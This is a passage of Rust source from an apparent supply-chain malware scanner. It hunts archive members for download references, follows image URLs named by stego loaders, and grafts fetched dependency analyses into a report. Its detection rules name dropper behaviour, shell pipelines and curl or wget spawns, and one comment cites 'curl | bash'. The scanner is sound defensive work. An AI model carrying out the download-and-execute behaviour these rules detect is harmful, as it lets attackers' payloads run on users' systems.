            .map_or_else(|| root_path.to_string_lossy(), |n| n.to_string_lossy());
        // A provenance document names one artifact and catalogues many. The
        // string hunt cannot tell those apart, so it is replaced by the subject
        // this document is *about* — see `provenance_subject`.
        let mut hunted = if is_provenance_document(&root.file_type, &name) {
            provenance_subject(&bytes).into_iter().collect()
        } else {
            find::references_in_bytes(&bytes, &name)
        };
        if is_ci_context(root) {
            for reference in &mut hunted {
                let context = reference
                    .context
                    .get_or_insert(filefacts::DependencyContext {
                        scope: filefacts::DependencyScope::Ci,
                        optional: false,
                        has_install_script: false,
                        installed_path: None,
                    });
                context.scope = filefacts::DependencyScope::Ci;
            }
        }
        if !hunted.is_empty() {
            merge_into_root(&mut groups, &root.sha256, hunted);
        }
    }
    hunt_download_members(report, root_path, ci, &mut groups);
    // Filefacts owns Go's module/workspace semantics. Include raw root hunts
    // in the inputs so they cannot reintroduce an unreconciled declaration.
    let mut group_refs: HashMap<&str, &[Reference]> = HashMap::new();
    for (sha, refs) in &groups {
        group_refs.entry(sha.as_str()).or_insert(refs.as_slice());
    }
    let go_members: Vec<_> = report
        .files
        .iter()
        .map(|file| filefacts::ReferenceMember {
            path: &file.path,
            references: group_refs.get(file.sha256.as_str()).copied().unwrap_or(&[]),
        })
        .collect();
    let go_context = filefacts::go_dependency_context(&go_members);
    for (sha, refs) in &mut groups {
        let contexts: Vec<_> = by_sha
            .get(sha.as_str())
            .into_iter()
            .flatten()
            .filter_map(|f| go_context.get(&f.path))
            .collect();
        if !contexts.is_empty() {
            // Identical manifest bytes may occur under different workspaces.
            // Keep every contextual edge; never let the last path win.
            refs.clear();
            for resolved in contexts {
                for reference in resolved {
                    if !refs.contains(reference) {
                        refs.push(reference.clone());
                    }
                }
            }
        }
    }
    groups
}

/// Most archive members a single scan re-reads for a text hunt. Each read
/// decompresses the root archive up to that member, so a crafted archive
/// packing many flagged members cannot turn the hunt into a decompression
/// storm; the members past the cap keep their declared references.
const MEMBER_HUNT_MAX: usize = 16;

/// cleave trait ids this module reads. cleave owns the taxonomy; naming every
/// id here keeps the module's dependence on it in one place.
const TRAIT_DROPPER: &str = "objectives/command-and-control/dropper/";
const TRAIT_DROPPER_EXECUTION: &str = "objectives/command-and-control/dropper/execution/";
const TRAIT_STEGO_LOADER: &str = "objectives/command-and-control/dropper/execution/stego-loader";
const TRAIT_STEGANOGRAPHY: &str = "objectives/anti-static/obfuscation/steganography/";
const TRAIT_SHELL_PIPELINE: &str = "micro-behaviors/process/create/shell/pipeline";
const TRAIT_PROCESS_CREATE: &str = "micro-behaviors/process/create/";
const TRAIT_IMAGE_FILE_URL: &str = "micro-behaviors/communications/http/url/path::image-file-url";
const TRAIT_SECURITY_HOLD_RECORD: &str = "registry-security-hold-record";

/// Trait-id namespaces whose findings show that a file downloads something in
/// order to run it: dropper objectives, a pipeline into a shell, and a process
/// spawn of `curl`/`wget`. Ordered most- to least-specific; the first match
/// names the reason a member was hunted.
fn download_intent(findings: &[Finding]) -> Option<&str> {
    let rank = |id: &str| {
        if id.starts_with(TRAIT_DROPPER) {
            Some(0)
        } else if id.starts_with(TRAIT_SHELL_PIPELINE) {
            Some(1)
        } else if id.starts_with(TRAIT_PROCESS_CREATE)
            && (id.contains("curl") || id.contains("wget"))
        {
            Some(2)
        } else {
            None
        }
    };
    findings
        .iter()
        .filter_map(|f| rank(&f.id).map(|r| (r, f.id.as_str())))
        .min_by_key(|(r, _)| *r)
        .map(|(_, id)| id)
}

/// Give archive members that show download intent the raw-text hunt the root
/// gets. A member's bytes are discarded after analysis, so a URL a source file
/// hands to a spawned `curl` — in any language, including ones with no
/// dedicated recognizer — never reached the work list: only the root's bytes
/// are re-read. The member's own findings are the gate, so an ordinary source
/// tree costs nothing; a flagged member is re-extracted from the root archive
/// and hunted like a root. Its references keep their recognizer as `source`;
/// the trait that justified the hunt is logged with it.
fn hunt_download_members(
    report: &AnalysisReport,
    root_path: &Path,
    ci: CiRefs,
    groups: &mut Vec<(String, Vec<Reference>)>,
) {
    let Some((root, members)) = report.files.split_first() else {
        return;
    };
    let prefix = format!("{}!!", root.path);
    let mut hunted_members = 0usize;
    for file in members {
        if ci == CiRefs::Skip && is_ci_context(file) {
            continue;
        }
        let Some(trigger) = download_intent(&file.findings) else {
            continue;
        };
        // Only a direct member of the root archive can be re-read: a nested
        // archive member (`!!`) or a decoded layer (`##`) has no path in it.
        let Some(member) = file
            .path
            .strip_prefix(&prefix)
            .filter(|m| !m.contains("!!") && !m.contains("##"))
        else {
            tracing::debug!(
                member = %file.path,
                trigger,
                "download intent in a nested or decoded member; bytes not re-readable, text hunt skipped"
            );
            continue;
        };
        if file.size > ROOT_HUNT_MAX_BYTES {
            tracing::debug!(
                member,
                trigger,
                size = file.size,
                "download intent in an oversized member; text hunt skipped"
            );
            continue;
        }
        if hunted_members == MEMBER_HUNT_MAX {
            tracing::info!(
                cap = MEMBER_HUNT_MAX,
                "member text-hunt cap reached; remaining flagged members keep declared references only"
            );
            break;
        }
        hunted_members += 1;
        let bytes = match cleave::extract_member(root_path, member) {
            Ok(Some(bytes)) => bytes,
            Ok(None) => {
                tracing::debug!(
                    member,
                    trigger,
                    "flagged member not re-readable from the root archive; text hunt skipped"
                );
                continue;
            }
            Err(e) => {
                tracing::warn!(member, trigger, "re-reading flagged member failed: {e:#}");
                continue;
            }
        };
        let hunted = find::references_in_bytes(&bytes, member);
        tracing::info!(
            member,
            trigger,
            references = hunted.len(),
            "member shows download intent; hunted its text for references"
        );
        if !hunted.is_empty() {
            merge_into_root(groups, &file.sha256, hunted);
        }
    }
}

/// Image extensions a stego loader carves its payload out of.
const IMAGE_CARRIER_EXTENSIONS: &[&str] = &["avif", "bmp", "gif", "jpeg", "jpg", "png", "webp"];

/// Whether a file's findings show it pulls a payload out of an image: a
/// stego-loader or steganography trait, or an image URL alongside a dropper
/// execution trait. Returns the trait that says so.
fn image_carrier_evidence(findings: &[Finding]) -> Option<&str> {
    let ids = || findings.iter().map(|f| f.id.as_str());
    ids()
        .find(|id| id.starts_with(TRAIT_STEGO_LOADER) || id.starts_with(TRAIT_STEGANOGRAPHY))
        .or_else(|| {
            ids()
                .any(|id| id == TRAIT_IMAGE_FILE_URL)
                .then(|| ids().find(|id| id.starts_with(TRAIT_DROPPER_EXECUTION)))
                .flatten()
        })
}

/// Image URLs that are payload carriers rather than page assets. An image URL
/// is normally skipped as a site resource (see [`NON_PAYLOAD_URL_EXTENSIONS`]);
/// it is followed only when the file that names it also carries image-carrier
/// evidence, so a README badge never costs a request but a loader's
/// `screenshot.png` with a PE appended is fetched and analyzed.
fn image_carrier_urls(
    report: &AnalysisReport,
    groups: &[(String, Vec<Reference>)],
) -> HashSet<String> {
    let mut evidence_by_sha: HashMap<&str, (&cleave::types::FileAnalysis, &str)> = HashMap::new();
    for file in &report.files {
        if let Some(evidence) = image_carrier_evidence(&file.findings) {
            evidence_by_sha
                .entry(file.sha256.as_str())
                .or_insert((file, evidence));
        }
    }
    let mut carriers = HashSet::new();
    for (sha, refs) in groups {
        let Some(&(file, evidence)) = evidence_by_sha.get(sha.as_str()) else {
            continue;
        };
        for reference in refs {
            let RefLocator::Url(url) = &reference.locator else {
                continue;
            };
            if reference.kind != RefKind::UrlFetch || !has_image_extension(url) {
                continue;
            }
            tracing::info!(
                url = %url,
                source = %file.path,
                evidence,
                "image URL named by a stego loader; following it as a payload carrier"
            );
            carriers.insert(url.clone());
        }
    }
    carriers
}

/// Whether a URL's path ends in an image extension.
fn has_image_extension(url: &str) -> bool {
    let Ok(parsed) = reqwest::Url::parse(url) else {
        return false;
    };
    parsed.path().rsplit_once('.').is_some_and(|(_, ext)| {
        IMAGE_CARRIER_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
    })
}

/// Whether this root is one of our own provenance records rather than a
/// collected artifact: hopper's `*.forage.json` collection sidecar, or the
/// normalized `*.registry.json` a fetch materializes.
fn is_provenance_document(file_type: &str, name: &str) -> bool {
    file_type == filefacts::FileType::Registry.label()
        || name
            .rsplit_once(".forage.")
            .is_some_and(|(_, ext)| ext.eq_ignore_ascii_case("json"))
}

/// The single artifact a provenance document is *about*, as a pinned reference.
///
/// These documents embed the provider's verbatim response, and for PyPI that is
/// the project's whole release catalogue: one 179 KB `diffusers` sidecar carries
/// 191 `files.pythonhosted.org` URLs covering every version ever published. The
/// string hunt has no way to tell the subject from the catalogue — it recovered
/// all 199 URLs and started pulling `diffusers` releases from 0.0.1 upward until
/// the URL budget stopped it. Mining our own cached metadata for dropper
/// candidates is the bug; the document already states its subject, so read that
/// instead of guessing from `strings`.
///
/// Parsed here rather than from filefacts' `values` because a large sidecar
/// exceeds cleave's JSON parse limit (76 KB) while still being small enough to
/// hunt, so the facts view cannot be relied on for exactly the documents that
/// carry the biggest catalogues.
fn provenance_subject(bytes: &[u8]) -> Option<Reference> {
    let doc: serde_json::Value = serde_json::from_slice(bytes).ok()?;
    let url = doc
        .pointer("/fetch/url")
        .or_else(|| doc.pointer("/registry/url"))
        .and_then(serde_json::Value::as_str)
        .filter(|u| !u.is_empty())?;
    // The recorded digest pins the fetch: this document exists because those
    // exact bytes were collected, so a mismatch is a substitution worth failing.
    let pinned_hash = doc
        .pointer("/artifact/sha256")
        .and_then(serde_json::Value::as_str)
        .filter(|d| d.len() == 64 && d.bytes().all(|b| b.is_ascii_hexdigit()))
        .map(|d| fletch::PinnedHash {
            algo: fletch::HashAlgo::Sha256,
            value: d.to_ascii_lowercase(),
        });
    let content_sha256 = pinned_hash.as_ref().map(|p| p.value.clone());
    let mut reference = Reference::new(
        RefLocator::Url(url.to_string()),
        RefKind::UrlFetch,
        "forage.fetch.url",
        url,
    );
    reference.pinned_hash = pinned_hash;
    reference.content_sha256 = content_sha256;
    Some(reference)
}

fn is_vendored_node_module(path: &str) -> bool {
    path.split(['/', '\\'])
        .any(|component| component == "node_modules")
}

/// Package roots physically present under `node_modules`, keyed by their full
/// virtual path. Only roots with an analyzed package.json enter the index, so
/// an incidental path component named node_modules is not enough.
#[derive(Default)]
struct LocalNpmPackages {
    roots: HashSet<String>,
    declarations: HashMap<String, (String, String)>,
}

impl LocalNpmPackages {
    fn from_report(report: &AnalysisReport) -> Self {
        let roots = report
            .files
            .iter()
            .filter_map(|file| npm_package_root(&file.path))
            .collect();
        let mut declarations = HashMap::new();
        let paths: HashSet<_> = report
            .files
            .iter()
            .filter(|f| !f.analysis_gaps.is_empty())
            .map(|f| f.path.replace('\\', "/"))
            .collect();
        let analyzed: HashSet<_> = report
            .files
            .iter()
            .filter(|f| f.analysis_gaps.is_empty())
            .map(|f| f.path.replace('\\', "/"))
            .collect();
        for file in &report.files {
            let Some(root) = npm_package_root(&file.path) else {
                continue;
            };
            let Some(view) = &file.filefacts else {
                continue;
            };
            let Some(npm) = view.values.get("npm") else {
                continue;
            };
            let Some(name) = npm.get("name").and_then(serde_json::Value::as_str) else {
                continue;
            };
            let Some(version) = npm.get("version").and_then(serde_json::Value::as_str) else {
                continue;
            };
            let targets: Vec<_> = view
                .references
                .iter()
                .filter_map(|r| match &r.locator {
                    RefLocator::Path(path)
                        if r.kind == RefKind::Local && r.source.starts_with("package.json:") =>
                    {
                        Some(path)
                    }
                    _ => None,
                })
                .collect();
            // A manifest/README alone is not supplied executable code. Require
            // a captured entry point and all declared entry points, with no
            // incomplete member under this package. Wildcard-only exports and
            // implicit index.js deliberately remain external until established.
            if targets.is_empty()
                || !file.analysis_gaps.is_empty()
                || paths
                    .iter()
                    .any(|path| path.starts_with(&format!("{root}/")))
            {
                continue;
            }
            let complete = targets.iter().all(|target| {
                let Some(path) = safe_package_path(&root, target) else {
                    return false;
                };
                analyzed.contains(&path)
                    || (std::path::Path::new(&path).extension().is_none()
                        && [".js", ".json", "/index.js"]
                            .iter()
                            .any(|ext| analyzed.contains(&format!("{path}{ext}"))))
            });
            if complete {
                declarations.insert(root, (name.to_owned(), version.to_owned()));
            }
        }
        Self {
            roots,
            declarations,
        }
    }

    fn declared_coverage(
        &self,
        report: &AnalysisReport,
        source_sha: &str,
        reference: &Reference,
    ) -> Option<String> {
        if reference.kind != RefKind::Dependency {
            return None;
        }
        let coordinate = Coordinate::of(locator(reference)).filter(|c| c.typ == "npm")?;
        let version = coordinate.version?;
        let package = npm_import_name(reference)?;
        let sources: Vec<_> = report
            .files
            .iter()
            .filter(|f| f.sha256 == source_sha)
            .collect();
        if sources.is_empty() {
            return None;
        }
        let mut covered = Vec::new();
        for source in sources {
            let normalized = source.path.replace('\\', "/");
            let directory = virtual_parent(&normalized)?;
            let root = if let Some(installed) = reference
                .context
                .as_ref()
                .and_then(|c| c.installed_path.as_ref())
            {
                safe_package_path(&directory, installed)?
            } else {
                let mut dir = directory;
                loop {
                    let candidate = safe_package_path(&dir, &format!("node_modules/{package}"))?;
                    // A nearer installation shadows ancestors, even if it is
                    // incomplete or has a different version.
                    if self.roots.contains(&candidate) {
                        break candidate;
                    }
                    dir = virtual_parent(&dir)?;
                }
            };
            let (name, supplied_version) = self.declarations.get(&root)?;
            if name != &package || supplied_version != version {
                return None;
            }
            covered.push(root);
        }
        Some(covered.join(", "))
    }

    /// Mirror Node's package-level lookup: walk upward from the importing
    /// file, looking for `node_modules/<package>`. Exports and subpaths do not
    /// matter here because fletch retrieves whole packages.
    fn resolves(&self, source_path: &str, package: &str) -> bool {
        let normalized = source_path.replace('\\', "/");
        let Some((mut dir, _)) = normalized.rsplit_once('/') else {
            return false;
        };
        loop {
            if self
                .roots
                .contains(&format!("{dir}/node_modules/{package}"))
            {
                return true;
            }
            let Some((parent, _)) = dir.rsplit_once('/') else {
                return false;
            };
            dir = parent;
        }
    }
}

/// A virtual member's parent stops at its archive boundary.
fn virtual_parent(path: &str) -> Option<String> {
    if let Some((archive, member)) = path.rsplit_once("!!") {
        if member.is_empty() {
            return None;
        }
        return Some(match member.rsplit_once('/') {
            Some((parent, _)) => format!("{archive}!!{parent}"),
            None => format!("{archive}!!"),
        });
    }
    path.rsplit_once('/').map(|(parent, _)| parent.to_owned())
}

fn safe_package_path(root: &str, target: &str) -> Option<String> {
    let target = target.replace('\\', "/");
    if target.starts_with('/') || target.contains([':', '!', '*']) {
        return None;
    }
    let mut components = Vec::new();
    for part in target.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                components.pop()?;
            }
            other => components.push(other),
        }
    }
    (!components.is_empty()).then(|| {
        let separator = if root.ends_with("!!") { "" } else { "/" };
        format!("{root}{separator}{}", components.join("/"))
    })
}

/// Return the virtual package root for an analyzed node_modules/package.json.
fn npm_package_root(path: &str) -> Option<String> {
    let normalized = path.replace('\\', "/");
    let root = normalized.strip_suffix("/package.json")?;
    let (_, package) = root
        .rsplit_once("/node_modules/")
        .or_else(|| root.rsplit_once("!!node_modules/"))?;
    let mut parts = package.split('/');
    let first = parts.next()?;
    let valid = if let Some(scope) = first.strip_prefix('@') {
        let name = parts.next().unwrap_or_default();
        !scope.is_empty() && !name.is_empty() && parts.next().is_none()
    } else {
        !first.is_empty() && parts.next().is_none()
    };
    valid.then(|| root.to_string())
}

/// Extract the npm package name from a reference produced by
/// `find::import_calls`. Such PURLs are normally versionless; tolerating a
/// version keeps this correct if fletch later learns one from the symbol.
fn npm_import_name(reference: &Reference) -> Option<String> {
    let RefLocator::Purl(purl) = &reference.locator else {
        return None;
    };
    let coordinate = Coordinate::of(purl).filter(|c| c.typ == "npm")?;
    Some(
        coordinate
            .path
            .replace("%40", "@")
            .replace("%2F", "/")
            .replace("%2f", "/"),
    )
}

/// Merge the root's hunted references into its group (creating it if the root
/// declared none), skipping any locator already present.
fn merge_into_root(
    groups: &mut Vec<(String, Vec<Reference>)>,
    root_sha: &str,
    hunted: Vec<Reference>,
) {
    if !groups.iter().any(|(sha, _)| sha == root_sha) {
        groups.push((root_sha.to_string(), Vec::new()));
    }
    let Some((_, group)) = groups.iter_mut().find(|(sha, _)| sha == root_sha) else {
        return; // unreachable: just ensured the group exists
    };
    let mut seen: HashSet<String> = group.iter().map(|r| locator(r).to_owned()).collect();
    for r in hunted {
        if r.kind == RefKind::Undefined {
            if !group.contains(&r) {
                group.push(r);
            }
            continue;
        }
        if seen.insert(locator(&r).to_owned()) {
            group.push(r);
        }
    }
}

/// Scope follows the edge into a dependency tree: runtime imports of a
/// development tool are still development-only work for the scanned artifact.
fn inherit_dependency_context(parent: &Reference, groups: &mut [Group]) {
    let Some(parent) = &parent.context else {
        return;
    };
    for (_, references) in groups {
        for reference in references {
            let context = reference
                .context
                .get_or_insert(filefacts::DependencyContext {
                    scope: filefacts::DependencyScope::Runtime,
                    optional: false,
                    has_install_script: false,
                    installed_path: None,
                });
            use filefacts::DependencyScope;
            if parent.scope == DependencyScope::Ci
                || (parent.scope == DependencyScope::Development
                    && context.scope != DependencyScope::Ci)
                || (parent.scope == DependencyScope::Build
                    && context.scope == DependencyScope::Runtime)
            {
                context.scope = parent.scope;
            }
            context.optional |= parent.optional;
        }
    }
}

fn fetch_work_key(reference: &Reference) -> String {
    format!("{}|{:?}", locator(reference), reference.pinned_hash)
}

/// A reference's locator as written — the key dedup, rows, memos, and
/// registry findings pair on.
fn locator(r: &Reference) -> &str {
    locator_str(&r.locator)
}

/// A locator's text: the PURL, URL or path as written. Empty for a locator
/// kind this scan predates, which names nothing it can look up.
pub(crate) fn locator_str(locator: &RefLocator) -> &str {
    match locator {
        RefLocator::Purl(s) | RefLocator::Url(s) | RefLocator::Path(s) => s,
        _ => "",
    }
}

/// Every finding a finalized sub-report carries, flattened across its file
/// nodes — the seed half the package pass contributes from one side (artifact
/// or registry metadata).
fn sub_findings(sub: &AnalysisReport) -> Vec<Finding> {
    sub.files
        .iter()
        .flat_map(|f| f.findings.iter().cloned())
        .collect()
}

/// The product of analyzing one fetched payload: the finalized sub-report to
/// graft (absent if the payload couldn't be analyzed) and the next-hop
/// references found in its own bytes. Produced off the report so the expensive
/// analysis can run concurrently; [`merge_payload`] folds it in serially.
struct Analyzed {
    content_sha: String,
    sub: Option<AnalysisReport>,
    next_from_bytes: Vec<Group>,
    /// The corpus verdict adopted in place of analyzing these bytes — set only
    /// when hopper's stored verdict came from the analyzer this build is
    /// running (see [`Standing`]).
    corpus: Option<Verdict>,
}

/// Everything analyzing a fetched payload reads: the blob cache its bytes sit
/// in, the analysis options, the warm analysis cache, and hopper's corpus.
struct Payloads<'a> {
    cache: &'a BlobCache,
    opts: &'a AnalysisOptions,
    acache: Option<&'a AnalysisCache>,
    precheck: Option<&'a Precheck>,
}

impl Payloads<'_> {
    /// Analyze every landed payload of a group, one slot per input in order
    /// (`None` where there was nothing to analyze).
    ///
    /// The payloads fan out as rayon tasks, so the whole pool works the batch: a
    /// dependency carrying a large native binary — a minutes-long,
    /// single-threaded disassembly that no amount of threads can split — runs
    /// *alongside* its siblings instead of being metered a couple at a time.
    /// Nesting is safe and is the point: each payload's own analysis is itself
    /// rayon-parallel, and a task that blocks awaiting its children steals and
    /// runs other pending work. Either way `on_analyzed` fires as each payload
    /// settles, and the indexed collect preserves input order.
    ///
    /// Concurrency is bounded by the pool width (work-stealing runs ~one payload
    /// per worker at a time), so at most that many payloads' bytes are resident
    /// at once — the batch size itself never dictates peak memory.
    fn analyze_all(
        &self,
        landed: &[Landed],
        fanout: Fanout,
        on_analyzed: &(dyn Fn(usize) + Sync),
    ) -> Vec<Option<Analyzed>> {
        let one = |(i, l): (usize, &Landed)| {
            let analyzed = self.analyze(l);
            PAYLOADS_ANALYZED_TOTAL.fetch_add(1, Ordering::Relaxed);
            on_analyzed(i);
            analyzed
        };
        if fanout.allowed() {
            use rayon::prelude::*;
            landed.par_iter().enumerate().map(one).collect()
        } else {
            landed.iter().enumerate().map(one).collect()
        }
    }

    /// Analyze a fetched payload's bytes (the expensive, report-independent half
    /// of grafting): hunt its own bytes for next-hop references and run cleave
    /// over it. `None` when there is nothing to merge: no bytes in hand, a
    /// benign verdict that stands in the corpus, or bytes gone from the cache.
    /// Pure with respect to the report, so it is safe to run concurrently;
    /// [`merge_payload`] does the report mutation.
    fn analyze(&self, landed: &Landed) -> Option<Analyzed> {
        let rec = &landed.record;
        match &landed.standing {
            // The batch PURL negotiation answered before any download: the
            // corpus's verdict is this dependency's, under the sha it named.
            Standing::Adopt(verdict) => {
                return Some(Analyzed {
                    content_sha: rec.content_sha256.clone()?,
                    sub: None,
                    next_from_bytes: Vec::new(),
                    corpus: Some(verdict.clone()),
                });
            }
            Standing::SkipBenign => return None,
            Standing::Analyze => {}
        }
        // Scan whatever bytes we hold: a clean fetch, a pin mismatch, or a pin
        // we could not verify (the pin outcomes are exactly the cases worth
        // analyzing). Skipped/unresolved/failed have no bytes — and fletch
        // always states the digest of bytes it delivered.
        if !delivered_bytes(rec) {
            return None;
        }
        let content_sha = rec.content_sha256.clone()?;

        // Warm-cache hit: reuse the prior analysis of these exact bytes,
        // skipping the re-analysis (a minutes-long disassembly for a big native
        // binary). Keyed by content sha under a ruleset-version namespace, so an
        // entry is only ever one the current detector produced — a
        // rules/engine change misses and re-scans.
        if let Some(hit) = self.acache.and_then(|ac| ac.get(&content_sha)) {
            tracing::debug!(
                locator = %rec.locator,
                content_sha = %content_sha,
                "analysis cache hit; reusing prior result"
            );
            return Some(Analyzed {
                content_sha,
                sub: hit.sub,
                next_from_bytes: hit.next,
                corpus: None,
            });
        }

        // Fleet-shared skip: the corpus already holds a verdict for these exact
        // bytes that spares the analysis. The local cache above is better when
        // it hits (it returns the full sub-report to graft); this covers the
        // fleet-wide case it cannot — another worker analyzed the same
        // dependency, or a release just invalidated every local cache at once.
        match self.precheck.map_or(Standing::Analyze, |precheck| {
            precheck.standing(&content_sha)
        }) {
            Standing::Analyze => {}
            standing => {
                tracing::debug!(
                    locator = %rec.locator,
                    content_sha = %content_sha,
                    adopted = matches!(standing, Standing::Adopt(_)),
                    "corpus precheck: verdict stands in hopper; skipping re-analysis"
                );
                // Same analyzer: its verdict is the one this scan would have
                // computed, so it is carried through as this dependency's
                // result. A benign skip carries nothing to report.
                let Standing::Adopt(verdict) = standing else {
                    return None;
                };
                return Some(Analyzed {
                    content_sha,
                    sub: None,
                    next_from_bytes: Vec::new(),
                    corpus: Some(verdict),
                });
            }
        }

        let Some(bytes) = self.cache.load(&rec.locator) else {
            tracing::debug!(locator = %rec.locator, "fetched bytes gone from the blob cache; not analyzed");
            return None;
        };
        let name = payload_name(rec);

        // Next-hop references discovered in the payload's own bytes — the full
        // hunt, so a stage-2 script's `curl | bash` (or an encoded URL) is
        // followed.
        let mut next_from_bytes = Vec::new();
        let mut payload_refs = find::references_in_bytes(&bytes, &name);
        mark_redirect_destinations(&bytes, &mut payload_refs);
        if !payload_refs.is_empty() {
            next_from_bytes.push((content_sha.clone(), payload_refs));
        }

        let sub = match cleave::analyze_bytes_owned(bytes, &name, self.opts) {
            Ok(mut sub) => {
                // finalize() collapses the sub-analysis into its files[]; without
                // it the payload's data stays in top-level fields and files[] is
                // empty.
                sub.finalize();
                Some(sub)
            }
            Err(e) => {
                tracing::warn!("analysis of fetched {} failed: {e:#}", rec.locator);
                None
            }
        };

        // Memoize for the next run's warm hit (best-effort; borrowed, so no
        // clone of the report). Only cache a definite result — an analysis
        // error might be a transient (a cache-evicted byte, an OOM), so leave it
        // to re-run.
        if let Some(ac) = self.acache
            && sub.is_some()
        {
            ac.put(&content_sha, &sub, &next_from_bytes);
        }

        Some(Analyzed {
            content_sha,
            sub,
            next_from_bytes,
            corpus: None,
        })
    }
}

/// The record a corpus-satisfied dependency gets instead of a download: no
/// bytes, no budget charge, hopper's sha as `content_sha256` so the fetch edge
/// (`source → content`) is still recorded. Served from a cache — the corpus —
/// rather than the network. Its verdict travels beside it, in
/// [`Landed::standing`].
fn corpus_hit_record(r: &Reference, source_sha: &str, sha: &str) -> FetchRecord {
    FetchRecord {
        source_sha256: (!source_sha.is_empty()).then(|| source_sha.to_owned()),
        context: r.context.clone(),
        coverage_note: None,
        source_offset: r.offset,
        kind: r.kind,
        locator: locator(r).to_owned(),
        resolved_url: None,
        final_url: None,
        redirects: Vec::new(),
        status: None,
        headers: Vec::new(),
        fetched_at: Some(unix_now()),
        content_sha256: Some(sha.to_string()),
        size: None,
        served: Some(Served::Cache),
        pin_verified: None,
        outcome: Outcome::Skipped,
    }
}

/// Capture a fetched payload's standalone report for upload as its own hopper
/// sample. The report is the pristine one cleave produced for the dependency's
/// own bytes (container at depth 0, correct member structure) — so it needs no
/// rerooting, unlike reconstructing a subtree out of the merged parent report.
/// Compacted from a borrow: no clone of the report, and no strip pass (the raw is
/// never fed to a model here, and a single dependency never nears the body
/// limit). Returns `None` when there is nothing to upload.
fn capture_dependency(rec: &FetchRecord, analyzed: &Analyzed) -> Option<FetchedDependency> {
    let sub = analyzed.sub.as_ref()?;
    let compact = cleave::types::compact::compact_from_files(&sub.files);
    let raw = serde_json::to_string(&compact)
        .map_err(|e| tracing::warn!(locator = %rec.locator, error = %e, "dependency report could not be serialized for upload"))
        .ok()?;
    let url = fetched_url(rec).unwrap_or_default().to_owned();
    Some(FetchedDependency {
        locator: rec.locator.clone(),
        url,
        content_sha: analyzed.content_sha.clone(),
        size: rec.size.unwrap_or(0),
        raw,
    })
}

/// Where grafted nodes attach: the next free file id, and the first node of
/// each content sha — the one a scan of `report.files` would find — as
/// `(id, depth)`. Built once per fetch phase and kept current as nodes are
/// appended, so each graft costs a lookup rather than two passes over a report
/// that grows with every payload.
#[derive(Debug, Default)]
struct Graft {
    next_id: u32,
    first: HashMap<String, (u32, u32)>,
}

impl Graft {
    fn new(report: &AnalysisReport) -> Self {
        let mut graft = Self::default();
        for file in &report.files {
            graft.note(file);
        }
        graft
    }

    fn note(&mut self, file: &cleave::types::FileAnalysis) {
        self.next_id = self.next_id.max(file.id.saturating_add(1));
        self.first
            .entry(file.sha256.clone())
            .or_insert((file.id, file.depth));
    }

    /// The `(id, depth)` of the file `sha` names, falling back to the root.
    fn parent(&self, sha: Option<&str>) -> (u32, u32) {
        sha.and_then(|sha| self.first.get(sha))
            .copied()
            .unwrap_or((0, 0))
    }

    /// Append one node, keeping the index current.
    fn push(&mut self, report: &mut AnalysisReport, file: cleave::types::FileAnalysis) {
        self.note(&file);
        report.files.push(file);
    }
}

/// Graft a materialized registry sub-report under the file that declared the
/// dependency (its sha256), mirroring [`merge_payload`]'s id/depth re-basing.
/// The node carries only facts — a registry document references nothing to
/// fetch — so no next-hop work-list is produced. Returns the registry node's id.
fn merge_registry(
    report: &mut AnalysisReport,
    graft: &mut Graft,
    parent_sha: &str,
    sub: AnalysisReport,
) -> Option<u32> {
    let (parent_id, parent_depth) = graft.parent(Some(parent_sha));
    let id_base = graft.next_id;
    let mut root_id = None;
    for mut file in sub.files {
        // The registry document itself (the sub-report's root) is a sidecar:
        // metadata about its parent package, analyzed from its own canonical
        // JSON bytes so its findings feed ML, but not standalone content.
        if file.parent_id.is_none() {
            file.rel = cleave::types::Rel::Registry;
            file.role = cleave::types::Role::Sidecar;
            root_id = Some(file.id + id_base);
        }
        file.id += id_base;
        file.parent_id = Some(file.parent_id.map_or(parent_id, |p| p + id_base));
        file.depth += parent_depth + 1;
        graft.push(report, file);
    }
    root_id
}

/// Give a dependency whose verdict came from the corpus the same node a fetched
/// payload gets from [`merge_payload`]: attached to the file that declared it,
/// named by its locator, marked [`Rel::Fetched`](cleave::types::Rel::Fetched)
/// and carrying the URL it came from. It has no members and no traits of its
/// own — nothing was analyzed here — so it is the identity a verdict hangs on,
/// not an analysis result.
fn append_adopted_node(
    report: &mut AnalysisReport,
    graft: &mut Graft,
    rec: &FetchRecord,
    content_sha: &str,
) {
    let (parent_id, parent_depth) = graft.parent(rec.source_sha256.as_deref());
    let via = fetch_target(rec);
    let node = cleave::types::FileAnalysis {
        id: graft.next_id,
        parent_id: Some(parent_id),
        depth: parent_depth + 1,
        path: rec.locator.clone(),
        sha256: content_sha.to_string(),
        size: rec.size.unwrap_or(0),
        rel: cleave::types::Rel::Fetched,
        via: (!via.is_empty()).then(|| via.to_owned()),
        ..cleave::types::FileAnalysis::default()
    };
    graft.push(report, node);
}

/// Fold an [`Analyzed`] payload into the report: append its file nodes nested
/// under the file that declared the reference, and return the references the
/// payload yields for the next hop. The fetch edge (`source_sha256 →
/// content_sha256`) is the authoritative link; ids and depth are renumbered so
/// the grafted nodes are a well-formed subtree that never collides with the main
/// report's. Must run serially — it reads and extends `report.files`.
fn merge_payload(
    report: &mut AnalysisReport,
    graft: &mut Graft,
    rec: &FetchRecord,
    analyzed: Analyzed,
) -> Vec<Group> {
    let mut next = analyzed.next_from_bytes;
    let Some(sub) = analyzed.sub else {
        // Nothing was analyzed, but the corpus handed us this dependency's
        // verdict. Give it the node a grafted payload would have had, so the
        // adopted result has somewhere to live: the tree shows the dependency,
        // `ml.files` can carry its grade, and the backref pass can find it by
        // content sha. Without a node an adopted verdict would be invisible —
        // the hole this whole path exists to close.
        if analyzed.corpus.is_some() {
            append_adopted_node(report, graft, rec, &analyzed.content_sha);
        }
        return next;
    };

    // Attach under the file that declared the reference (its sha256 is the
    // edge's source endpoint); fall back to the root file.
    let (parent_id, parent_depth) = graft.parent(rec.source_sha256.as_deref());
    let id_base = graft.next_id;
    // The resolved download URL (falling back to the bare locator/PURL) this
    // subtree came from, recorded on the graft root as `via`.
    let via = Some(fetch_target(rec))
        .filter(|via| !via.is_empty())
        .map(str::to_owned);
    // Name the subtree for what it is. cleave named these from payload_name — the
    // URL's basename, which it needs for extension type detection but which says
    // nothing about origin. In the merged report that left a fetched dependency
    // indistinguishable from an archive member, and put two dependencies whose
    // URLs end in the same basename (index.js, package.tgz, download) under one
    // path, so anything keyed on path merged them.
    //
    // The locator is unique per dependency and is what a reader recognizes.
